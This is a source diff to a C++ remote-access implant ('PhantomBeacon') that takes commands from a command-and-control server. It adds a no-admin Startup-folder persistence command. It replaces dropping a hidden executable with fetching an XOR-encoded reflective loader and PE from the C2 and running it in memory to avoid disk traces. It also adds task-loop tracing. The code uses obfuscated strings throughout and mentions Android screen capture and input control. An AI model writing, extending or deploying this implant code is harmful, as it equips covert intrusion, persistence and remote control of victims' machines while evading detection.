@@ -236,6 +236,13 @@ static const size_t kMaxTaskOutput = 512 * 1024;
 #define PHANTOM_SHELL_TRACE 0
 #endif
 
+// Temporary diagnostic build switch: writes the check-in/task stages to
+// %TEMP%\phantom_cam_trace.log (the same file media_utils::xtrace uses).
+// 0 in every normal build; only flipped for a live troubleshooting build.
+#ifndef PHANTOM_TASK_TRACE
+#define PHANTOM_TASK_TRACE 0
+#endif
+
 #if PHANTOM_SHELL_TRACE
 // ── Diagnostic-only spawn tracing ─────────────────────────────────────────
 // These helpers are compiled out of every normal beacon. They answer three
@@ -1264,6 +1271,18 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         return persistence::establish_linux(name);
 #endif
     }
+    else if (action == XOR_DEC(XOR_STR("persist2")).c_str()) {
+        // Strategy 2: no-admin Startup .cmd (no PE). Live-tested because
+        // schtasks /sc onlogon is access-denied for this non-admin lab user.
+        std::string name;
+        iss >> name;
+        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
+#ifdef _WIN32
+        return persistence::establish_windows_startup(cfg, name);
+#else
+        return XOR_DEC(XOR_STR("persist2 is Windows-only")).c_str();
+#endif
+    }
     else if (action == XOR_DEC(XOR_STR("unpersist")).c_str()) {
         // Remove EXACTLY what `persist` installed (same RunKey value /
         // systemd unit / autostart file / cron line / on-disk copy). The
@@ -1527,13 +1546,13 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         if (iss >> tok) r_ssl = std::atoi(tok.c_str());
 #ifdef _WIN32
         // The fetch always targets the configured C2 (http_request uses
-        // cfg.host/cfg.port); r_host/r_port/r_ssl only shape the arguments
-        // handed to the spawned module. The path carries NO query string:
-        // the per-beacon token travels in X-Auth-Token, because a ?auth=
-        // query used to break the HMAC signature (server signs request.path)
-        // and the fetch failed 401 "Unauthorized" (12 bytes) — live defect
-        // 2026-10-19.
-        std::string url = "/api/v1/remote_payload_windows";
+        // cfg.host/cfg.port). The path carries NO query string: the
+        // per-beacon token travels in X-Auth-Token, because a ?auth= query
+        // used to break the HMAC signature (server signs request.path) and
+        // the fetch failed 401 "Unauthorized" (12 bytes) — live defect
+        // 2026-10-19. The _mem route serves the reflective loader + PE,
+        // XOR-0xAA; the legacy on-disk PE route is not used by the beacon.
+        std::string url = "/api/v1/remote_payload_windows_mem";
 #elif defined(__ANDROID__) || defined(ANDROID)
         std::string url = "/api/v1/remote_payload_android";
 #else
@@ -1548,34 +1567,22 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
                    std::to_string(bin.size()) + " (" + bin.substr(0, 60) + ")";
         }
 #ifdef _WIN32
-        // write to a random temp name and spawn hidden
-        char tmp[MAX_PATH];
-        GetTempPathA(MAX_PATH, tmp);
-        std::string path = std::string(tmp) + "srv" + std::to_string(GetCurrentProcessId()) + ".exe";
-        HANDLE hf = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
-        if (hf == INVALID_HANDLE_VALUE)
-            return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write module")).c_str();
-        DWORD w;
-        WriteFile(hf, bin.data(), (DWORD)bin.size(), &w, nullptr);
-        CloseHandle(hf);
-        STARTUPINFOA si{};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi{};
-        std::string cmd = path + " " + r_host + " " + std::to_string(r_port) +
-                          " " + std::to_string(r_ssl);
-        if (!CreateProcessA(nullptr, &cmd[0], nullptr, nullptr, FALSE,
-                            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                            nullptr, nullptr, &si, &pi)) {
-            DeleteFileA(path.c_str());
-            return XOR_DEC(XOR_STR("REMOTE_ERROR: spawn failed")).c_str();
+        // Reflective PIC path: the C2 serves loader+remote-PE XOR-0xAA, so
+        // nothing is written to %TEMP% and no child process is created.
+        // The loader maps the PE in this process, resolves imports/relocs/
+        // TLS callbacks and calls its entry point. The remote module keeps
+        // its own compiled C2 config (argv is ignored when the inherited
+        // beacon command line is not a valid host/port pair).
+        (void)r_host;
+        (void)r_port;
+        (void)r_ssl;
+        std::vector<unsigned char> mem(bin.begin(), bin.end());
+        for (auto& octet : mem) octet = (unsigned char)(octet ^ 0xAA);
+        std::string mem_err;
+        if (inmemory::run_shellcode(mem, &mem_err)) {
+            return XOR_DEC(XOR_STR("Remote session module deployed in-memory (no disk); interact via `beacons`")).c_str();
         }
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return XOR_DEC(XOR_STR("Remote session module deployed (pid ")).c_str() +
-                       std::to_string(pi.dwProcessId) + XOR_DEC(XOR_STR("); interact via `beacons`")).c_str();
+        return XOR_DEC(XOR_STR("REMOTE_ERROR: reflective in-memory exec failed: ")).c_str() + mem_err;
 #elif defined(__ANDROID__) || defined(ANDROID)
         // Android: the module is an APK (MediaProjection capture +
         // AccessibilityService input). A memfd exec cannot start an APK —
@@ -2042,6 +2049,10 @@ extern "C" void beacon_main(int argc, char** argv) {
 #endif
 
         std::string response = net::checkin(cfg, telemetry);
+#if PHANTOM_TASK_TRACE
+        media_utils::xtrace(response.empty() ? "t:resp=EMPTY"
+            : ("t:resp=" + std::to_string(response.size())).c_str());
+#endif
 
         if (!response.empty()) {
             consecutive_failures = 0;
@@ -2066,6 +2077,9 @@ extern "C" void beacon_main(int argc, char** argv) {
                     return net::send_result(cfg, task_id, output);
                 });
             auto tasks = json_mini::parse_tasks(response);
+#if PHANTOM_TASK_TRACE
+            media_utils::xtrace(("t:tasks=" + std::to_string(tasks.size())).c_str());
+#endif
             for (auto& task : tasks) {
                 ++tasks_done;
                 g_tasks_done = tasks_done;
@@ -2087,7 +2101,13 @@ extern "C" void beacon_main(int argc, char** argv) {
                         budget_ms = 45000; // MF init + frame grabs can be slow
                     }
                 }
+#if PHANTOM_TASK_TRACE
+                media_utils::xtrace(("t:run=" + task.command).c_str());
+#endif
                 std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
+#if PHANTOM_TASK_TRACE
+                media_utils::xtrace(("t:out=" + std::to_string(output.size())).c_str());
+#endif
                 if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                     if (output[2] == 'E' && output[3] == 'X') {
                         alive = false;
@@ -2105,7 +2125,11 @@ extern "C" void beacon_main(int argc, char** argv) {
                         break;
                     }
                 }
-                if (!net::send_result(cfg, task.task_id, output)) {
+                bool sent = net::send_result(cfg, task.task_id, output);
+#if PHANTOM_TASK_TRACE
+                media_utils::xtrace(sent ? "t:sent=1" : "t:sent=0");
+#endif
+                if (!sent) {
                     pending_results.emplace_back(task.task_id, output);
                 }
             }
